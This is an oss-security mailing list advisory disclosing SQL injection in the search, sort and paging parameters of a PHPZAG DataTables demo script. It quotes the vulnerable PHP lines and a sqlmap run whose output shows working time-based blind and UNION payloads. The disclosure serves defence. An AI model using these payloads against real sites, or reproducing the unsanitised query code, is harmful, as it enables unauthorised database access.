  oss-security - SQL Injection in search field of phpzag live add edit delete data  tables records with ajax php mysql            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Thu, 09 Jul From: "Larry W. Cashdollar" <larry0@...com> To: Open Security <oss-security@...ts.openwall.com> Subject: SQL Injection in search field of phpzag live add edit delete data  tables records with ajax php mysql  SQL Injection in search field of phpzag live add edit delete data tables records with ajax php mysql Author: Larry W. Cashdollar, @_larry0 Date: Download Site: https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/ Vendor: PHPZAG Vendor Notified: Advisory: Description: DataTables is a jQuery JavaScript library to convert simple HTML tables to dynamic feature-rich tables. The jQuery DataTables are very user friendly to list records with live add, edit, delete records without page refresh. Due to this, DataTables used widely in web applications to list records.  Vulnerability: There is SQL injection in the search function in Records.php:  SQL injection in search parameter:    20     if(!empty($_POST["search"]["value"])){  21                         $sqlQuery .= 'where(id LIKE "%'.$_POST["search"]["value"].'%" ';  22                         $sqlQuery .= ' OR name LIKE "%'.$_POST["search"]["value"].'%" ';  23                         $sqlQuery .= ' OR designation LIKE "%'.$_POST["search"]["value"].'%" ';  24                         $sqlQuery .= ' OR address LIKE "%'.$_POST["search"]["value"].'%" ';  25                         $sqlQuery .= ' OR skills LIKE "%'.$_POST["search"]["value"].'%") ';  26                 }  27   SQL Injection in line 29 with 'order' and 'column' parameter:    28                 if(!empty($_POST["order"])){  29                         $sqlQuery .= 'ORDER BY '.$_POST['order']['0']['column'].' '.$_POST['order']['0']['dir'].' ';  30                 } else {  31                         $sqlQuery .= 'ORDER BY id DESC ';  32                 }  SQL Injection line 35 with 'start' and 'length' parameters:    34                 if($_POST["length"] != -1){  35                         $sqlQuery .= 'LIMIT ' . $_POST['start'] . ', ' . $_POST['length'];  36                 } Exploit Code: $ sqlmap -u --data  -p "search[value]" --method POST --dbms=mysql --level 2 --risk 2 . . [INFO] POST parameter 'search[value]' appears to be 'MySQL >= AND time-based blind (query SLEEP)' injectable for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (2) and risk (2) values? [Y/n] y [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns' [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found [INFO] target URL appears to be UNION injectable with 6 columns [INFO] POST parameter 'search[value]' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable POST parameter 'search[value]' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y sqlmap identified the following injection point(s) with a total of HTTP(s) requests: --- Parameter: search[value] (POST)     Type: AND/OR time-based blind     Title: MySQL >= AND time-based blind (query SLEEP)     Payload:  and 1") AND (SELECT * FROM (SELECT(SLEEP(5)))KGDc) AND ("Aejs"="Aejs&search[regex]=false&action=listRecords       Type: UNION query     Title: Generic UNION query (NULL) - 6 columns     Payload:  and 1") UNION ALL SELECT SkNj&search[regex]=false&action=listRecords --- [INFO] the back-end DBMS is MySQL web server operating system: Linux Ubuntu web application technology: Apache back-end DBMS: MySQL >=      Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      